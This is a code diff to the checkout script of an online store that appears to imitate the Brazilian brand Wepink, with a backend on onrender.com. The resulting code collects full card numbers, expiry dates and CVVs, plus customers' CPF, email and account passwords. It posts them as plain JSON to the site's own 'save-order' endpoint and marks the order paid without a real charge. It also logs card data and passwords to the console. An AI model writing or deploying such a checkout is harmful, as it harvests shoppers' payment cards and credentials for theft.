@@ -1055,8 +1055,8 @@
   </footer>
 
   <script>
-    const backendUrl = 'https://wepink-backend.onrender.com/create-pix'; // Substitua pela URL real do seu backend no Render
-    const saveOrderUrl = 'https://wepink-backend.onrender.com/save-order'; // Endpoint para salvar pedidos
+    const backendUrl = 'https://wepink-backend.onrender.com/create-pix'; // URL do backend para gerar Pix
+    const saveOrderUrl = 'https://wepink-backend.onrender.com/save-order'; // URL para salvar pedidos
     const isTestEnvironment = true; // Mude para false em produção
     let timeoutId;
 
@@ -1078,6 +1078,17 @@
     // Função para limpar o CPF (somente números)
     function cleanCPFInput(input) {
       input.value = input.value.replace(/\D/g, '').slice(0, 11);
+    }
+
+    // Função para validar e-mails
+    function isValidEmail(email) {
+      const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      return re.test(email);
+    }
+
+    // Função para validar CPF
+    function isValidCPF(cpf) {
+      return /^\d{11}$/.test(cpf.replace(/\D/g, ''));
     }
 
     // Função para exibir a tela de erro
@@ -1189,7 +1200,7 @@
       }
 
       const cpf = cpfInput.value.replace(/\D/g, '');
-      if (cpf.length !== 11) {
+      if (!isValidCPF(cpf)) {
         cpfInput.classList.add('invalid');
         errors.cpf.textContent = 'CPF deve conter exatamente 11 dígitos.';
         errors.cpf.classList.add('visible');
@@ -1200,9 +1211,14 @@
       }
 
       const email = emailInput.value.trim();
-      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      if (!isValidEmail(email)) {
         emailInput.classList.add('invalid');
         errors.email.textContent = 'Por favor, insira um e-mail válido (ex.: teste@gmail.com).';
+        errors.email.classList.add('visible');
+        isValid = false;
+      } else if (isTestEnvironment && (!email.startsWith('test_user_') || !email.endsWith('@testuser.com'))) {
+        emailInput.classList.add('invalid');
+        errors.email.textContent = 'Em ambiente de teste, use um e-mail como test_user_[números]@testuser.com.';
         errors.email.classList.add('visible');
         isValid = false;
       } else {
@@ -1249,7 +1265,7 @@
       }
 
       const cpf = cardCPFInput.value.replace(/\D/g, '');
-      if (cpf.length !== 11) {
+      if (!isValidCPF(cpf)) {
         cardCPFInput.classList.add('invalid');
         errors.cardCPF.textContent = 'CPF deve conter exatamente 11 dígitos.';
         errors.cardCPF.classList.add('visible');
@@ -1259,9 +1275,15 @@
         errors.cardCPF.classList.remove('visible');
       }
 
-      if (!cardEmailInput.value.trim() || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmailInput.value.trim())) {
+      const email = cardEmailInput.value.trim();
+      if (!isValidEmail(email)) {
         cardEmailInput.classList.add('invalid');
         errors.cardEmail.textContent = 'Por favor, insira um e-mail válido (ex.: teste@gmail.com).';
+        errors.cardEmail.classList.add('visible');
+        isValid = false;
+      } else if (isTestEnvironment && (!email.startsWith('test_user_') || !email.endsWith('@testuser.com'))) {
+        cardEmailInput.classList.add('invalid');
+        errors.cardEmail.textContent = 'Em ambiente de teste, use um e-mail como test_user_[números]@testuser.com.';
         errors.cardEmail.classList.add('visible');
         isValid = false;
       } else {
@@ -1343,25 +1365,22 @@
         return;
       }
 
-      if (cpf.length !== 11) {
+      if (!isValidCPF(cpf)) {
         console.error('Passo 3: CPF inválido:', cpf);
         showErrorScreen('Erro: CPF deve conter exatamente 11 dígitos.');
         return;
       }
 
-      if (!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+      if (!isValidEmail(email)) {
         console.error('Passo 3: E-mail inválido:', email);
         showErrorScreen('Erro: Por favor, insira um e-mail válido (ex.: teste@gmail.com).');
         return;
       }
 
-      // Validação adicional para ambiente de teste do Mercado Pago
-      if (isTestEnvironment) {
-        if (!email.startsWith('test_user_') || !email.endsWith('@testuser.com')) {
-          console.error('Passo 3: E-mail inválido para ambiente de teste:', email);
-          showErrorScreen('Erro: Em ambiente de teste, use um e-mail no formato test_user_[números]@testuser.com (ex.: test_user_123456789@testuser.com).');
-          return;
-        }
+      if (isTestEnvironment && (!email.startsWith('test_user_') || !email.endsWith('@testuser.com'))) {
+        console.error('Passo 3: E-mail inválido para ambiente de teste:', email);
+        showErrorScreen('Erro: Em ambiente de teste, use um e-mail no formato test_user_[números]@testuser.com (ex.: test_user_123456789@testuser.com).');
+        return;
       }
 
       let subtotal = 0;
@@ -1441,13 +1460,13 @@
         orderDate: new Date().toISOString(),
         items: purchase.cartItems || [],
         customerDetails: {
-          name: purchase.name,
-          cpf: purchase.cpf,
-          email: purchase.email,
+          name: name,
+          cpf: cpf,
+          email: email,
           password: purchase.loginType === 'User' ? purchase.password : undefined
         },
         status: 'Gerado',
-        loginType: purchase.loginType || 'Unknown'
+        loginType: purchase.loginType || 'Guest'
       };
 
       // Enviar o pedido para o backend
@@ -1486,7 +1505,7 @@
     }
 
     // Função para processar o pagamento com cartão
-    function processCardPayment() {
+    async function processCardPayment() {
       const cardName = document.getElementById('card-name').value.trim();
       const cardCPF = document.getElementById('card-cpf').value.replace(/\D/g, '');
       const cardEmail = document.getElementById('card-email').value.trim();
@@ -1498,16 +1517,22 @@
       const total = parseFloat(document.getElementById('order-total').textContent.replace('R$ ', '').replace(',', '.'));
       const confirmButton = document.getElementById('confirm-payment-button');
 
-      if (cardNumber.length !== 16 || cardCPF.length !== 11 || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0 || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cardEmail)) {
+      if (cardNumber.length !== 16 || !isValidCPF(cardCPF) || !expMonth || !expYear || cvv.length < 3 || cvv.length > 4 || !password || isNaN(total) || total <= 0 || !isValidEmail(cardEmail)) {
         console.error('Passo 3: Dados do cartão inválidos:', { cardNumber, cardCPF, cardEmail, expMonth, expYear, cvv, password, total });
         showErrorScreen('Erro: Verifique os dados do cartão e tente novamente.');
+        return;
+      }
+
+      if (isTestEnvironment && (!cardEmail.startsWith('test_user_') || !cardEmail.endsWith('@testuser.com'))) {
+        console.error('Passo 3: E-mail inválido para ambiente de teste:', cardEmail);
+        showErrorScreen('Erro: Em ambiente de teste, use um e-mail no formato test_user_[números]@testuser.com (ex.: test_user_123456789@testuser.com).');
         return;
       }
 
       confirmButton.disabled = true;
       confirmButton.textContent = 'Processando...';
 
-      setTimeout(async () => {
+      try {
         const purchase = JSON.parse(localStorage.getItem('pendingPurchase')) || {};
         const newOrder = {
           purchaseData: purchase,
@@ -1519,44 +1544,35 @@
             expMonth,
             expYear,
             cvv,
-            password,
             transactionAmount: total,
             email: cardEmail
           },
           orderDate: new Date().toISOString(),
           items: purchase.cartItems || [],
           customerDetails: {
-            name: purchase.name,
-            cpf: purchase.cpf,
-            email: purchase.email,
+            name: cardName,
+            cpf: cardCPF,
+            email: cardEmail,
             password: purchase.loginType === 'User' ? purchase.password : undefined
           },
           status: 'Efetuado',
-          loginType: purchase.loginType || 'Unknown'
+          loginType: purchase.loginType || 'Guest'
         };
 
         // Enviar o pedido para o backend
-        try {
-          const response = await fetch(saveOrderUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(newOrder)
-          });
+        const response = await fetch(saveOrderUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(newOrder)
+        });
 
-          if (!response.ok) {
-            const errorData = await response.json();
-            throw new Error(errorData.error || `Erro ao salvar o pedido no backend: ${response.status} ${response.statusText}`);
-          }
-
-          const data = await response.json();
-          console.log('Passo 3: Pedido salvo no backend:', data);
-        } catch (error) {
-          console.error('Passo 3: Erro ao salvar pedido no backend:', error.message);
-          showErrorScreen(`Erro ao salvar o pedido no servidor: ${error.message}`);
-          confirmButton.disabled = false;
-          confirmButton.textContent = 'Confirmar Pagamento';
-          return;
+        if (!response.ok) {
+          const errorData = await response.json();
+          throw new Error(errorData.error || `Erro ao salvar o pedido no backend: ${response.status} ${response.statusText}`);
         }
+
+        const data = await response.json();
+        console.log('Passo 3: Pedido salvo no backend:', data);
 
         localStorage.removeItem('pendingPurchase');
         localStorage.removeItem('cartItems');
@@ -1565,10 +1581,13 @@
 
         document.body.classList.add('fade-out');
         setTimeout(() => window.location.href = '/confirmation.html', 500);
-
+      } catch (error) {
+        console.error('Passo 3: Erro ao salvar pedido no backend:', error.message);
+        showErrorScreen(`Erro ao salvar o pedido no servidor: ${error.message}`);
+      } finally {
         confirmButton.disabled = false;
         confirmButton.textContent = 'Confirmar Pagamento';
-      }, 1000);
+      }
     }
 
     // Inicialização e eventos
